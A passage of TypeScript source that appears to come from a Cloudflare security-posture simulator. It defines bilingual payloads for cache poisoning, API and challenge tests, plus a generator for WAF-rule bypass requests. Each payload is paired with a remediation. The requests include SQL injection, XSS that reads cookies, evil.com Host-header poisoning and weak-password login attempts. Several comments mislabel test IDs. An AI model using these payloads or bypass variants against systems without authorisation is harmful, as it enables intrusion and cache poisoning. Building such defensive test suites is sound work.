    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar TLS 1.3 para mejor rendimiento y seguridad.', en: 'Enable TLS 1.3 for better performance and security.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/tls-13/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-011',
  },
  {
    id: 'SIM-T050', module: 'ssl_tls', severity: 'medium',
    name: { es: 'SSL Mode No Full (Strict)', en: 'SSL Mode Not Full (Strict)' },
    description: { es: 'Verificar que SSL mode sea Full (Strict).', en: 'Verify SSL mode is Full (Strict).' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Configurar SSL mode a Full (Strict).', en: 'Set SSL mode to Full (Strict).' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Overview', docs_url: '/ssl/origin-configuration/ssl-modes/full-strict/', effort: 'quick_fix', roadmap_phase: 2 },
    finding_id: 'SIM-010',
  },
  {
    id: 'SIM-T051', module: 'ssl_tls', severity: 'low',
    name: { es: 'Verificaci\u00f3n Opportunistic Encryption', en: 'Opportunistic Encryption Check' },
    description: { es: 'Verificar si Opportunistic Encryption est\u00e1 habilitado.', en: 'Check if Opportunistic Encryption is enabled.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar Opportunistic Encryption.', en: 'Enable Opportunistic Encryption.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/opportunistic-encryption/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-011',
  },
  {
    id: 'SIM-T052', module: 'ssl_tls', severity: 'info',
    name: { es: 'HTTPS Redirect Timing', en: 'HTTPS Redirect Timing' },
    description: { es: 'Medir tiempo de redirecci\u00f3n HTTP\u2192HTTPS.', en: 'Measure HTTP to HTTPS redirect time.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Redirecci\u00f3n debe ser 301 con < 100ms.', en: 'Redirect should be 301 with < 100ms.' }, cf_product: 'SSL/TLS', dashboard_path: 'SSL/TLS > Edge Certificates', docs_url: '/ssl/edge-certificates/additional-options/always-use-https/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-010',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 7: Cache Poisoning / Deception (8 tests)
// ════════════════════════════════════════════════════════════════════

const CACHE_POISONING: PayloadDefinition[] = [
  {
    id: 'SIM-T053', module: 'cache_poisoning', severity: 'high',
    name: { es: 'Host Header Variation', en: 'Host Header Variation' },
    description: { es: 'Enviar Host header diferente al dominio real.', en: 'Send different Host header than real domain.' },
    request: { method: 'GET', path: '/', headers: { 'Host': 'evil.com' } },
    recommendation: { action: { es: 'Verificar que CF normaliza el Host header correctamente.', en: 'Verify CF normalizes Host header correctly.' }, cf_product: 'Cache Rules', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/cache-security/avoid-web-poisoning/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-012',
  },
  {
    id: 'SIM-T054', module: 'cache_poisoning', severity: 'high',
    name: { es: 'Cache Deception Path', en: 'Cache Deception Path' },
    description: { es: 'A\u00f1adir extensi\u00f3n cacheable a ruta din\u00e1mica (/account.css).', en: 'Append cacheable extension to dynamic path (/account.css).' },
    request: { method: 'GET', path: '/account.css' },
    recommendation: { action: { es: 'Habilitar Cache Deception Armor.', en: 'Enable Cache Deception Armor.' }, cf_product: 'Cache Deception Armor', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/cache-security/cache-deception-armor/', effort: 'quick_fix', roadmap_phase: 3 },
    finding_id: 'SIM-012',
  },
  {
    id: 'SIM-T055', module: 'cache_poisoning', severity: 'medium',
    name: { es: 'Query String Cache Bust', en: 'Query String Cache Bust' },
    description: { es: 'Par\u00e1metros aleatorios para evadir cache.', en: 'Random parameters to evade cache.' },
    request: { method: 'GET', path: '/?cb=12345&_=98765' },
    recommendation: { action: { es: 'Configurar Query String Sort en cache rules.', en: 'Configure Query String Sort in cache rules.' }, cf_product: 'Cache Rules', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/advanced-configuration/query-string-sort/', effort: 'moderate', roadmap_phase: 4 },
    finding_id: 'SIM-013',
  },
  {
    id: 'SIM-T056', module: 'cache_poisoning', severity: 'medium',
    name: { es: 'X-Forwarded-Host Poisoning', en: 'X-Forwarded-Host Poisoning' },
    description: { es: 'Inyecci\u00f3n de header X-Forwarded-Host para envenenamiento.', en: 'X-Forwarded-Host header injection for poisoning.' },
    request: { method: 'GET', path: '/', headers: { 'X-Forwarded-Host': 'evil.com' } },
    recommendation: { action: { es: 'Verificar que el origen ignore X-Forwarded-Host no confiable.', en: 'Verify origin ignores untrusted X-Forwarded-Host.' }, cf_product: 'Transform Rules', dashboard_path: 'Rules > Transform Rules', docs_url: '/rules/transform/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-012',
  },
  {
    id: 'SIM-T057', module: 'cache_poisoning', severity: 'medium',
    name: { es: 'Variaci\u00f3n de Accept Header', en: 'Accept Header Variation' },
    description: { es: 'Cambiar Accept para obtener respuesta diferente del cache.', en: 'Change Accept to get different cached response.' },
    request: { method: 'GET', path: '/', headers: { 'Accept': 'application/json' } },
    recommendation: { action: { es: 'Incluir Accept header en cache key si se sirve contenido variado.', en: 'Include Accept header in cache key if serving varied content.' }, cf_product: 'Cache Rules', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/how-to/cache-keys/', effort: 'moderate', roadmap_phase: 4 },
    finding_id: 'SIM-013',
  },
  {
    id: 'SIM-T058', module: 'cache_poisoning', severity: 'low',
    name: { es: 'Cache-Control Consistency', en: 'Cache-Control Consistency' },
    description: { es: 'Verificar consistencia de headers de cache en m\u00faltiples requests.', en: 'Verify cache header consistency across multiple requests.' },
    request: { method: 'GET', path: '/styles.css' },
    recommendation: { action: { es: 'Configurar Edge Cache TTL y Browser Cache TTL consistentes.', en: 'Configure consistent Edge Cache TTL and Browser Cache TTL.' }, cf_product: 'Cache Rules', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/how-to/edge-browser-cache-ttl/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-013',
  },
  {
    id: 'SIM-T059', module: 'cache_poisoning', severity: 'medium',
    name: { es: 'Path Confusion (.js como HTML)', en: 'Path Confusion (.js as HTML)' },
    description: { es: 'Solicitar ruta .js esperando content-type HTML.', en: 'Request .js path expecting HTML content-type.' },
    request: { method: 'GET', path: '/login.js' },
    recommendation: { action: { es: 'Cache Deception Armor protege contra path confusion.', en: 'Cache Deception Armor protects against path confusion.' }, cf_product: 'Cache Deception Armor', dashboard_path: 'Caching > Cache Rules', docs_url: '/cache/cache-security/cache-deception-armor/', effort: 'quick_fix', roadmap_phase: 3 },
    finding_id: 'SIM-012',
  },
  {
    id: 'SIM-T060', module: 'cache_poisoning', severity: 'info',
    name: { es: 'Verificaci\u00f3n cf-cache-status', en: 'cf-cache-status Verification' },
    description: { es: 'Verificar presencia y valores del header cf-cache-status.', en: 'Verify presence and values of cf-cache-status header.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Monitorear ratios HIT/MISS en Cache Analytics.', en: 'Monitor HIT/MISS ratios in Cache Analytics.' }, cf_product: 'Cache Analytics', dashboard_path: 'Caching > Overview', docs_url: '/cache/performance-review/cache-analytics/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-013',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 8: API Endpoint Security (8 tests)
// ════════════════════════════════════════════════════════════════════

const API_SECURITY: PayloadDefinition[] = [
  {
    id: 'SIM-T061', module: 'api_security', severity: 'high',
    name: { es: 'SQLi en API JSON Body', en: 'SQLi in API JSON Body' },
    description: { es: 'Payload SQLi dentro de JSON enviado a API.', en: 'SQLi payload inside JSON sent to API.' },
    request: { method: 'POST', path: '/api/search', headers: { 'Content-Type': 'application/json' }, body: '{"q":"admin\' OR \'1\'=\'1","page":1}' },
    recommendation: { action: { es: 'WAF inspecciona JSON bodies. Verificar managed rules activas.', en: 'WAF inspects JSON bodies. Verify managed rules are active.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T062', module: 'api_security', severity: 'medium',
    name: { es: 'M\u00e9todo HTTP Inesperado (DELETE)', en: 'Unexpected HTTP Method (DELETE)' },
    description: { es: 'Enviar DELETE a endpoint que solo deber\u00eda aceptar GET/POST.', en: 'Send DELETE to endpoint that should only accept GET/POST.' },
    request: { method: 'DELETE', path: '/api/users/1' },
    recommendation: { action: { es: 'Implementar Schema Validation para restringir m\u00e9todos.', en: 'Implement Schema Validation to restrict methods.' }, cf_product: 'API Shield', dashboard_path: 'Security > API Shield', docs_url: '/api-shield/security/schema-validation/', effort: 'complex', roadmap_phase: 4 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T063', module: 'api_security', severity: 'medium',
    name: { es: 'Body Sobredimensionado (1MB)', en: 'Oversized Body (1MB)' },
    description: { es: 'Enviar cuerpo de 1MB a endpoint API.', en: 'Send 1MB body to API endpoint.' },
    request: { method: 'POST', path: '/api/upload', headers: { 'Content-Type': 'application/json' }, body: '{"data":"' + 'A'.repeat(1000) + '..."}' },
    recommendation: { action: { es: 'Configurar l\u00edmites de tama\u00f1o en WAF custom rules.', en: 'Configure size limits in WAF custom rules.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T064', module: 'api_security', severity: 'medium',
    name: { es: 'JSON Malformado', en: 'Malformed JSON' },
    description: { es: 'Enviar JSON inv\u00e1lido a endpoint API.', en: 'Send invalid JSON to API endpoint.' },
    request: { method: 'POST', path: '/api/data', headers: { 'Content-Type': 'application/json' }, body: '{invalid json content' },
    recommendation: { action: { es: 'Schema Validation rechaza payloads no conformes.', en: 'Schema Validation rejects non-conforming payloads.' }, cf_product: 'API Shield', dashboard_path: 'Security > API Shield', docs_url: '/api-shield/security/schema-validation/', effort: 'complex', roadmap_phase: 4 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T065', module: 'api_security', severity: 'high',
    name: { es: 'XSS en API Parameter', en: 'XSS in API Parameter' },
    description: { es: 'Payload XSS en par\u00e1metro de API.', en: 'XSS payload in API parameter.' },
    request: { method: 'GET', path: '/api/search?q=<script>document.cookie</script>' },
    recommendation: { action: { es: 'WAF managed rules deben cubrir endpoints API tambi\u00e9n.', en: 'WAF managed rules should cover API endpoints too.' }, cf_product: 'WAF Managed Rules', dashboard_path: 'Security > WAF > Managed rules', docs_url: '/waf/managed-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T066', module: 'api_security', severity: 'medium',
    name: { es: 'Content-Type Mismatch', en: 'Content-Type Mismatch' },
    description: { es: 'Enviar XML con Content-Type JSON.', en: 'Send XML with JSON Content-Type.' },
    request: { method: 'POST', path: '/api/data', headers: { 'Content-Type': 'application/json' }, body: '<?xml version="1.0"?><root><test>1</test></root>' },
    recommendation: { action: { es: 'Validar Content-Type en el origen y con custom rules.', en: 'Validate Content-Type at origin and with custom rules.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'moderate', roadmap_phase: 4 },
    finding_id: 'SIM-014',
  },
  {
    id: 'SIM-T067', module: 'api_security', severity: 'high',
    name: { es: 'Credenciales Expuestas en Login', en: 'Exposed Credentials at Login' },
    description: { es: 'Enviar credenciales conocidas como comprometidas a /login.', en: 'Send known compromised credentials to /login.' },
    request: { method: 'POST', path: '/login', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'username=admin&password=password123' },
    recommendation: { action: { es: 'Habilitar Leaked Credentials Detection.', en: 'Enable Leaked Credentials Detection.' }, cf_product: 'Leaked Credentials Detection', dashboard_path: 'Security > Settings', docs_url: '/waf/detections/leaked-credentials/', effort: 'quick_fix', roadmap_phase: 3 },
    finding_id: 'SIM-015',
  },
  {
    id: 'SIM-T068', module: 'api_security', severity: 'info',
    name: { es: 'Endpoint Discovery Scan', en: 'Endpoint Discovery Scan' },
    description: { es: 'Probar endpoints comunes (/api/v1/, /graphql, /admin/api).', en: 'Probe common endpoints (/api/v1/, /graphql, /admin/api).' },
    request: { method: 'GET', path: '/api/v1/' },
    recommendation: { action: { es: 'Habilitar API Discovery para monitorear endpoints.', en: 'Enable API Discovery to monitor endpoints.' }, cf_product: 'API Shield Discovery', dashboard_path: 'Security > API Shield > Discovery', docs_url: '/api-shield/security/api-discovery/', effort: 'complex', roadmap_phase: 4 },
    finding_id: 'SIM-014',
  },
];

// ════════════════════════════════════════════════════════════════════
// Module 9: Challenge Page Analysis (8 tests)
// ════════════════════════════════════════════════════════════════════

const CHALLENGE_ANALYSIS: PayloadDefinition[] = [
  {
    id: 'SIM-T069', module: 'challenge_analysis', severity: 'medium',
    name: { es: 'Trigger Challenge con Security Level', en: 'Trigger Challenge via Security Level' },
    description: { es: 'Verificar qu\u00e9 activa managed challenge basado en security level.', en: 'Verify what triggers managed challenge based on security level.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': '' } },
    recommendation: { action: { es: 'Security Level determina umbral de desaf\u00edo. Verificar configuraci\u00f3n.', en: 'Security Level determines challenge threshold. Verify configuration.' }, cf_product: 'Security Level', dashboard_path: 'Security > Settings', docs_url: '/waf/tools/security-level/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T070', module: 'challenge_analysis', severity: 'medium',
    name: { es: 'Detecci\u00f3n de Tipo de Challenge', en: 'Challenge Type Detection' },
    description: { es: 'Identificar si el challenge es managed, JS o interactive.', en: 'Identify if challenge is managed, JS, or interactive.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': 'bot-scanner/1.0' } },
    recommendation: { action: { es: 'Usar Managed Challenge (recomendado) en vez de JS/Interactive.', en: 'Use Managed Challenge (recommended) instead of JS/Interactive.' }, cf_product: 'Challenge Pages', dashboard_path: 'Security > WAF', docs_url: '/cloudflare-challenges/challenge-types/challenge-pages/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T071', module: 'challenge_analysis', severity: 'low',
    name: { es: 'cf-mitigated Header Check', en: 'cf-mitigated Header Check' },
    description: { es: 'Verificar presencia de header cf-mitigated: challenge.', en: 'Verify presence of cf-mitigated: challenge header.' },
    request: { method: 'GET', path: '/', headers: { 'User-Agent': '' } },
    recommendation: { action: { es: 'El header cf-mitigated indica challenge activo.', en: 'The cf-mitigated header indicates active challenge.' }, cf_product: 'Challenge Pages', dashboard_path: 'Security > WAF', docs_url: '/cloudflare-challenges/challenge-types/challenge-pages/detect-response/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T072', module: 'challenge_analysis', severity: 'medium',
    name: { es: 'Challenge con Path Sensible', en: 'Challenge on Sensitive Path' },
    description: { es: 'Verificar que /admin requiere challenge o bloqueo.', en: 'Verify /admin requires challenge or block.' },
    request: { method: 'GET', path: '/admin' },
    recommendation: { action: { es: 'Crear regla custom para proteger rutas admin.', en: 'Create custom rule to protect admin paths.' }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T073', module: 'challenge_analysis', severity: 'low',
    name: { es: 'Challenge Passage TTL', en: 'Challenge Passage TTL' },
    description: { es: 'Verificar el TTL de clearance del challenge.', en: 'Verify challenge clearance TTL.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Challenge TTL de 30 min es recomendado como m\u00ednimo.', en: 'Challenge TTL of 30 min is recommended minimum.' }, cf_product: 'Security Settings', dashboard_path: 'Security > Settings', docs_url: '/cloudflare-challenges/challenge-types/challenge-pages/challenge-passage/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T074', module: 'challenge_analysis', severity: 'medium',
    name: { es: 'Under Attack Mode Detection', en: 'Under Attack Mode Detection' },
    description: { es: 'Detectar si "I\'m Under Attack" est\u00e1 activo.', en: 'Detect if "I\'m Under Attack" mode is active.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Under Attack Mode solo para emergencias, no permanente.', en: 'Under Attack Mode only for emergencies, not permanent.' }, cf_product: 'Security Level', dashboard_path: 'Security > Settings', docs_url: '/fundamentals/reference/under-attack-mode/', effort: 'quick_fix', roadmap_phase: 5 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T075', module: 'challenge_analysis', severity: 'info',
    name: { es: 'Turnstile Detection', en: 'Turnstile Detection' },
    description: { es: 'Verificar si Turnstile est\u00e1 implementado en formularios.', en: 'Verify if Turnstile is implemented on forms.' },
    request: { method: 'GET', path: '/login' },
    recommendation: { action: { es: 'Implementar Turnstile en formularios cr\u00edticos.', en: 'Implement Turnstile on critical forms.' }, cf_product: 'Turnstile', dashboard_path: 'Turnstile', docs_url: '/turnstile/', effort: 'moderate', roadmap_phase: 3 },
    finding_id: 'SIM-016',
  },
  {
    id: 'SIM-T076', module: 'challenge_analysis', severity: 'info',
    name: { es: 'Privacy Pass Support', en: 'Privacy Pass Support' },
    description: { es: 'Verificar si Privacy Pass est\u00e1 habilitado para reducir challenges.', en: 'Verify if Privacy Pass is enabled to reduce challenges.' },
    request: { method: 'GET', path: '/' },
    recommendation: { action: { es: 'Habilitar Privacy Pass para mejorar UX de challenges.', en: 'Enable Privacy Pass to improve challenge UX.' }, cf_product: 'Privacy Pass', dashboard_path: 'Security > Settings', docs_url: '/waf/tools/privacy-pass/', effort: 'quick_fix', roadmap_phase: 6 },
    finding_id: 'SIM-017',
  },
];

// ════════════════════════════════════════════════════════════════════
// Export: All static payloads (Module 4 is dynamic)
// ════════════════════════════════════════════════════════════════════

export const STATIC_PAYLOADS: PayloadDefinition[] = [
  ...WAF_BYPASS,
  ...RATE_LIMIT,
  ...BOT_EVASION,
  ...IP_GEO,
  ...SSL_TLS,
  ...CACHE_POISONING,
  ...API_SECURITY,
  ...CHALLENGE_ANALYSIS,
];

/**
 * Build dynamic Module 4 payloads from Phase 1 intelligence.
 * Tests bypass of each custom rule by using casing, encoding, and path variations.
 */
export function buildCustomRuleBypassPayloads(
  rules: Array<{ id: string; description: string; expression: string; action: string; enabled: boolean }>,
): PayloadDefinition[] {
  const payloads: PayloadDefinition[] = [];
  let idx = 31; // SIM-T031 through SIM-T038

  const enabledRules = rules.filter((r) => r.enabled).slice(0, 4); // Test up to 4 rules

  for (const rule of enabledRules) {
    // Extract path patterns from the expression
    const pathMatch = rule.expression.match(/(?:uri\.path|uri)\s+(?:contains|eq)\s+"([^"]+)"/i);
    const testPath = pathMatch?.[1] || '/admin';

    // Test 1: Original casing
    payloads.push({
      id: `SIM-T0${idx}`, module: 'custom_rule_bypass', severity: 'high',
      name: { es: `Bypass regla: ${rule.description || rule.id} (casing)`, en: `Bypass rule: ${rule.description || rule.id} (casing)` },
      description: { es: `Probar variaci\u00f3n de may\u00fasculas en path de regla custom.`, en: `Test casing variation on custom rule path.` },
      request: { method: 'GET', path: testPath.toUpperCase() },
      recommendation: { action: { es: `Usar lower() en expresi\u00f3n de regla o operator "contains" case-insensitive.`, en: `Use lower() in rule expression or case-insensitive "contains" operator.` }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
      finding_id: 'SIM-004',
    });
    idx++;

    // Test 2: URL encoding
    const encoded = testPath.replace(/[a-zA-Z]/g, (c) => '%' + c.charCodeAt(0).toString(16));
    payloads.push({
      id: `SIM-T0${idx}`, module: 'custom_rule_bypass', severity: 'high',
      name: { es: `Bypass regla: ${rule.description || rule.id} (encoding)`, en: `Bypass rule: ${rule.description || rule.id} (encoding)` },
      description: { es: `Probar URL encoding en path de regla custom.`, en: `Test URL encoding on custom rule path.` },
      request: { method: 'GET', path: encoded },
      recommendation: { action: { es: `Usar url_decode() en expresi\u00f3n para manejar encoding.`, en: `Use url_decode() in expression to handle encoding.` }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
      finding_id: 'SIM-004',
    });
    idx++;
  }

  // Fill remaining slots to reach 8 tests
  while (payloads.length < 8) {
    payloads.push({
      id: `SIM-T0${idx}`, module: 'custom_rule_bypass', severity: 'medium',
      name: { es: `Bypass gen\u00e9rico: path traversal en admin`, en: `Generic bypass: path traversal in admin` },
      description: { es: `Probar /./admin, /../admin, /admin/ variaciones.`, en: `Test /./admin, /../admin, /admin/ variations.` },
      request: { method: 'GET', path: payloads.length % 2 === 0 ? '/./admin' : '/admin/' },
      recommendation: { action: { es: `Normalizar paths en expresiones custom.`, en: `Normalize paths in custom expressions.` }, cf_product: 'WAF Custom Rules', dashboard_path: 'Security > WAF > Custom rules', docs_url: '/waf/custom-rules/', effort: 'quick_fix', roadmap_phase: 1 },
      finding_id: 'SIM-004',
    });
    idx++;
  }

  return payloads;
}

/** Total expected payload count (static + dynamic) */
export const EXPECTED_TOTAL_TESTS = STATIC_PAYLOADS.length + 8; // 68 static + 8 dynamic = 76

// ════════════════════════════════════════════════════════════════════
// Subdomain Probe Payloads (~15 tests)
// ════════════════════════════════════════════════════════════════════

/**
 * Subset of critical tests to run against non-apex targets (subdomains).
 * Focuses on key security checks without the full 76-test suite.
 * 
 * Selected tests:
 * - WAF: 3 tests (XSS, SQLi, Path Traversal)
 * - Rate Limit: 2 tests (/ burst, /login burst)
 * - Bot: 2 tests (UA spoofing, headless detection)
 * - Cache: 2 tests (Host header, query poisoning)
 * - API: 2 tests (path traversal, verb tampering)
 * - SSL/TLS: 2 config checks (HTTPS redirect, HSTS)
 * - Challenge: 2 tests (JS challenge, managed challenge)
 */
export const SUBDOMAIN_PROBE_IDS = [
  // WAF top 3
  'SIM-T001',  // XSS payload
  'SIM-T002',  // SQL injection
  'SIM-T005',  // Path traversal
  
  // Rate Limit critical 2
  'SIM-T013',  // Burst to root
  'SIM-T014',  // Burst to /login
  
  // Bot Management 2
  'SIM-T021',  // Curl user-agent
  'SIM-T024',  // Headless Chrome
  
  // Cache Poisoning 2
  'SIM-T053',  // Host header injection
  'SIM-T054',  // Query string poisoning
  
  // API Security 2
  'SIM-T061',  // Path traversal in API
  'SIM-T063',  // HTTP verb tampering
  
  // SSL/TLS config 2
  'SIM-T045',  // HTTP redirect check
  'SIM-T046',  // HSTS header check
  
  // Challenge 2
  'SIM-T069',  // JS Challenge
  'SIM-T070',  // Managed Challenge
];

export const SUBDOMAIN_PROBE_PAYLOADS = STATIC_PAYLOADS.filter((p) =>
  SUBDOMAIN_PROBE_IDS.includes(p.id),
);
